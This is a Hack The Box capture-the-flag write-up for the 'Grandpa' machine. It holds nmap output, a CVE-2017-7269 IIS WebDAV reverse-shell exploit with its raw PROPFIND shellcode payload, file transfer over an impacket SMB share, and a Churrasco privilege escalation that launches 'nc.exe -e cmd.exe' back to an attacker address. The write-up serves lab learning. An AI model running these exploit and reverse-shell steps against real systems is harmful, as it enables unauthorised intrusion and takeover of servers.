---
layout: default
title: GRAND PA
description: by Hack The Box
---

<h3 align="center">
This has a bufferflow vulnerability that can give you a foothold on the machine. But I learned something new in this machine when trying to privesc to root. Moving files from my KALI to the windows victim using SMB.
</h3>

# Enumeration

1. Scan with nmap

   ```
   └─$ nmap -T4 -A -Pn --script vuln 10.10.10.14
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 00:00 EST
   Pre-scan script results:
   | broadcast-avahi-dos:
   |   Discovered hosts:
   |     224.0.0.251
   |   After NULL UDP avahi packet DoS (CVE-2011-1002).
   |_  Hosts are all up (not vulnerable).
   Nmap scan report for 10.10.10.14
   Host is up (0.032s latency).
   Not shown: 999 filtered tcp ports (no-response)
   PORT   STATE SERVICE VERSION
   80/tcp open  http    Microsoft IIS httpd 6.0
   |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
   | http-enum:
   |   /postinfo.html: Frontpage file or folder
   |   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
   |   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
   |   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
   |   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
   |   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
   |   /_vti_bin/shtml.dll: Frontpage file or folder
   |_  /_vti_bin/shtml.exe: Frontpage file or folder
   |_http-dombased-xss: Couldn't find any DOM based XSS.
   | vulners:
   |   cpe:/a:microsoft:internet_information_server:6.0:
   |       SSV:2903        10.0    https://vulners.com/seebug/SSV:2903     *EXPLOIT*
   |       PACKETSTORM:82956       10.0    https://vulners.com/packetstorm/PACKETSTORM:82956       *EXPLOIT*
   |       MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ    10.0    https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/IIS/MS01_033_IDQ     *EXPLOIT*
   |       MS01_033        10.0    https://vulners.com/canvas/MS01_033     *EXPLOIT*
   |       EDB-ID:20933    10.0    https://vulners.com/exploitdb/EDB-ID:20933      *EXPLOIT*
   |       EDB-ID:20932    10.0    https://vulners.com/exploitdb/EDB-ID:20932      *EXPLOIT*
   |       EDB-ID:20931    10.0    https://vulners.com/exploitdb/EDB-ID:20931      *EXPLOIT*
   |       EDB-ID:20930    10.0    https://vulners.com/exploitdb/EDB-ID:20930      *EXPLOIT*
   |       EDB-ID:16472    10.0    https://vulners.com/exploitdb/EDB-ID:16472      *EXPLOIT*
   |       CVE-2008-0075   10.0    https://vulners.com/cve/CVE-2008-0075
   |       CVE-2001-0500   10.0    https://vulners.com/cve/CVE-2001-0500
   |       SSV:30067       7.5     https://vulners.com/seebug/SSV:30067    *EXPLOIT*
   |       CVE-2007-2897   7.5     https://vulners.com/cve/CVE-2007-2897
   |       SSV:2902        7.2     https://vulners.com/seebug/SSV:2902     *EXPLOIT*
   |       CVE-2008-0074   7.2     https://vulners.com/cve/CVE-2008-0074
   |       EDB-ID:2056     6.5     https://vulners.com/exploitdb/EDB-ID:2056       *EXPLOIT*
   |       CVE-2006-0026   6.5     https://vulners.com/cve/CVE-2006-0026
   |       EDB-ID:585      5.0     https://vulners.com/exploitdb/EDB-ID:585        *EXPLOIT*
   |       CVE-2005-2678   5.0     https://vulners.com/cve/CVE-2005-2678
   |       CVE-2003-0718   5.0     https://vulners.com/cve/CVE-2003-0718
   |       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
   |       MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS     4.3     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS *EXPLOIT*
   |       EDB-ID:15167    4.3     https://vulners.com/exploitdb/EDB-ID:15167      *EXPLOIT*
   |       CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
   |       CVE-2005-2089   4.3     https://vulners.com/cve/CVE-2005-2089
   |_      CVE-2003-1582   2.6     https://vulners.com/cve/CVE-2003-1582
   | http-frontpage-login:
   |   VULNERABLE:
   |   Frontpage extension anonymous login
   |     State: VULNERABLE
   |       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
   |
   |     References:
   |_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
   |_http-csrf: Couldn't find any CSRF vulnerabilities.
   |_http-server-header: Microsoft-IIS/6.0
   Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 208.49 seconds
   ```

2. Googling exploits for the service Microsoft IIS httpd 6.0, we found https://www.exploit-db.com/exploits/41738. Also found a metasploit exploit from Rapid7 website.
3. In this, I tried so hard not to use metasploit but know that you can achieve the initial shell using MSFCONSOLE

# FootHold

4. Run a netcat listener `nc -nvlp 3612`
5. Download this python script from github
   ```
   sudo wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -O iis_reverse_shell.py
   ```
6. Then run the script with this syntax
   ```
   python iis_reverse_shell.py 10.10.10.14 80 10.10.14.2 1234
   ```
   `Note`: my head almost fell off my neck because my listener won't get the shell even after doing everything the way github wanted it to be. I found out that the GRANPA machine is like any other old man (LOL) who is grumpy and tempermental. You might need to reset the machine for this to work. A good giveaway that it will work is if you get this
   ```
   PROPFIND / HTTP/1.1
   Host: localhost
   Content-Length: 1744
   If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
   ```
   If you get that same output followed by something else like `HTTP/1.1 400 Bad Request`... then it means you need to restart the target machine.
7. You will now get a foothold shell on your listener. You will also immediately notice that you do not have privileges to even see the user flag. So privesc is needed.
8. One thing though, you will need find a folder where you can write and execute files. This is needed so you can upload your payload into this folder.
9. So not to spoil it, and so that you dont suffer as much as I have (LOL)... it is in one of the folders in the root directory C:\ there are only a few of them so try them out by using this
   ```
   echo test > 1.txt
   ```
   if the file saves, then its writtable and that is your baby! You only need to check the folders within the root directory and NOT the folders within these folders.

# PrivEsc to Root

10. Entering `sysinfo` we get more details about the server itself. I tried a gimmick I learned from the OPTIMUM (HTB) where I used the windows-exploit-suggesters script to find privesc suggestions.
11. I tried a few but gave up and went to a walkthrough.
12. Learnt that what will work is a binary named Churrasco.exe https://github.com/Re4son/Churrasco/raw/master/churrasco.exe. I've downloaded this file to my HTB folder and now I need to transfer this to my target machine.
13. Transferring this file is where I learned a new gimmick.
    First, we enable an SMB server from our HTB folder where my churrasco.exe file is saved and nc.exe is also saved (from previous boxes)

    ```
    impacket-smbserver smb .
    ```

    Important to note that the syntax for that command is `impacket-smbserver <share name> <share path>`. And because I was already inside my HTB folder, I just used `.`

    Copy churrasco (from the target machine)

    ```
    C:\wmpub>copy \\10.10.14.2\smb\churrasco.exe
    copy \\10.10.14.2\smb\churrasco.exe
            1 file(s) copied.
    ```

    Copy nc.exe (from the target machine)

    ```
    C:\wmpub>copy \\10.10.14.2\smb\nc.exe
    copy \\10.10.14.2\smb\nc.exe
            1 file(s) copied.
    ```

14. Start a listener on port 4444 `nc -nvlp 4444`
15. Now that the files are there the syntax to execute is
    ```
    .\churrasco.exe "C:\wmpub\nc.exe -e cmd.exe 10.10.14.2 4444"
    ```
16. From your netcat listener terminal, you should get a prompt.
17. User flag is in C:\Documents and Settings\Harry\Desktop\user.txt
18. Root flag is in Documents and Settings\Administrator\Desktop\root.txt

<br><br>

# Reference

1. https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
2. https://www.exploit-db.com/exploits/35936
3. https://github.com/Re4son/Churrasco/
4. https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
5. https://thecyberjedi.com/grandpa/
6. https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/

<br><br>

[back to HOME](./)
